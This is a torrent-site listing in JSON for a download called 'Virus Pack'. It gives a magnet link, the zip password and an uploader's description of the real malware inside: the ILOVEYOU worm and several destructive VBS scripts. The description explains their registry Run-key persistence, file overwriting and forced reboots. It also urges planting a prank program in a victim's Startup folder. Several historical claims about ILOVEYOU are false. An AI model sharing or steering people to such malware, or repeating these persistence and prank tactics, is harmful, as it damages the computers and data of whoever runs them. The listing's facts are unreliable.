{"title":"Virus Pack","uid":6617513,"size":3192767,"categoryP":"applications","categoryS":"windows","magnet":"?xt=urn:btih:8607a3b7a85229c128de21a1360787945079de3b&amp;dn=Virus+Pack&amp;tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;tr=udp%3A%2F%2Fopen.demonii.com%3A1337&amp;tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&amp;tr=udp%3A%2F%2Fexodus.desync.com%3A6969","seeders":0,"leechers":1,"uploader":"kejet","files":1,"time":1313801573,"description":"The zip pwd is: DontUnderestimateAVirus!!!OrElseItWillDestroyYourComputer!!!\n\nThis is a very small pack with real virusses.\n\nI found them scattered through the internet, and thought they would be safer on torrent-sites...\n\nSo, the virusses:\n\n1. Virus Of Doom fake virus (Virus Of Doom.exe)\n\nThis is a fun fake virus I just had to put in this pack!\nI recommend putting this file at a hidden location and put a shortcut in the Startup folder, so you could scare the shit out of someone!\n\nThe only way this fake virus can actually harm your computer, is by making it sort of slow... I am not a computer-expert, so don't ask me why... But this is actually quite funny, so go ahead and try it yourself (without the victim watching of course! :p )\n\nIf this fake virus DOES actually harm your computer, please report back (if possible), because that shouldn't happen!\n\nOh, and uhm, the icon of the Virus Of Doom.exe is the Flash-logo, where it is made in. So you could maybe possibly technically practically change the icon...\n\n2. ILOVEYOU virus (LOVE-LETTER-FOR-YOU.TXT.vbs)\n\nThis virus was created by Onel The Guzman.\nIn 2002 he 'accidentally' opened the virus and within approx. an hour it caused $10Billion dollars of damage!\nIt is unknown what this virus does, and I am NOT going to try it. (If you know what this virus does AT ALL, please report!)\n\nThis virus will mess up your system (unknown in what way(s)) and when opened, it will spread itself through Microsoft Outlook and it will send itself to every contact you have in Outlook, thanks to a leak, found by the creator itself.\nBut, because Outlook is old, and nearly nobody uses it anymore, this virus has a low change at causing spread-damage again, also because it's very easy to recognize the virus...\n\nBut it still messes up the computer it's launched on.\n\n3. Say Hello virus (dlH.vbs)\n\nThis virus simply creates a duplicate of ALL files and folders on your whole computer and keeps the same name, only with an added .HELLO extension. So that's pretty fucked up.\n\nThe creator of this virus created an auto-remover batch file that deleted every .hello file on the PC, but the site he/she uploaded it removed it. \n\nBut this is still a very annoying virus.\n\n4. System Reboot virus (dlRB.vbs)\n\nQuote from Creator:\n&quot;When this file is ran it will create a registry entry in HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\. This script will then write a script file to C:\\%systemroot%\\system32\\ called dlRB.vbs. This file (dlRB.vbs) will reboot the computer when ran and yup you guessed it... because of the registry entry this 'reboot' file runs each time the target tries to log into Windows. After the script is done it will force a system reboot.\n\nYou can remove the virus by booting to alternative OS, most likely you will use a DOS boot disk (make sure to add the program NTFSDOS.exe so you can mount your NTFS drives then just delete the c:\\%systemroot%\\system32\\dlRB.vbs file. Reboot as normal. Once logged into Windows remove the registry entry. If the machine happens to have a Telnet or SSH server running you can still log in using one of those services and manually delete the file.&quot;\n\n5. Happy Birthday virus (dlBD.vbs)\n\nThis virus is also known as the Timebomb virus.\nThis is a very nasty and unremovable virus (once opened)!\n\nQuote of creator:\n&quot;This VBS file when ran will:1) Check the date (This Virus is only active on my birthday therefore being classified a timebomb virus) 2) If it is NOT my birthday the file will create a rough copy of itself in %systemroot%\\system32\\ and then link that file to the registry location: HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ in order to run the file on each reboot. This file will continue to run on each reboot checking the date...this will continue until my birthday. Deleting the original 'host' file will NOT effect the trojanized copy. 3) If it IS my birthday the Virus will be activated. The Virus itself will search the entire machine for files ending with: .jpg, .gif, .log, .ini, .doc and .exe. When it finds a file with these extensions it will overwrite the original data with a 'happy birthday' message and then replace the current extension with a .txt extension. When it is done it will write and launch a batch file that says a happy birthday message.&quot;\n\nI searched through the virus and found out there are two dates the virus activates:\nMarch 31th\n&amp;\nDecember 19th\nI don't know why...\n\nThe creator says this virus is (once opened) unremovable!\n\n\n\nI don't remember where I got the Virus Of Doom from... Sry...\n\ndlH.vbs, dlRB.vbs and dlBD.vbs codes copied from: &lt;a href=&quot;\nhttp://www.tropicalpcsolutions.com/html/security/example-malicous-vb-javascript-code.html&quot; rel=&quot;nofollow&quot; target=&quot;_NEW&quot;&gt;\nhttp://www.tropicalpcsolutions.com/html/security/example-malicous-vb-javascript-code.html&lt;/a&gt;\n\nLOVE-LETTER-FOR-YOU.TXT.vbs code copied from: &lt;a href=&quot;\nhttp://www.elfqrin.com/docs/hakref/virus_iluvu_src.html&quot; rel=&quot;nofollow&quot; target=&quot;_NEW&quot;&gt;\nhttp://www.elfqrin.com/docs/hakref/virus_iluvu_src.html&lt;/a&gt; (BEWARE: You can see Onel The Guzman's face!!! ENTER AT OWN RISK!!!)\n\n\n\nFinally, I am not responsible for ANYTHING you do with this (except the Virus Of Doom :P ), USE THESE FILES AT YOUR OWN RISK!!!","torrent":{"xt":"urn:btih:8607a3b7a85229c128de21a1360787945079de3b","amp;dn":"Virus+Pack","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"8607a3b7a85229c128de21a1360787945079de3b","infoHashBuffer":{"type":"Buffer","data":[134,7,163,183,168,82,41,193,40,222,33,161,54,7,135,148,80,121,222,59]},"announce":[],"urlList":[]}}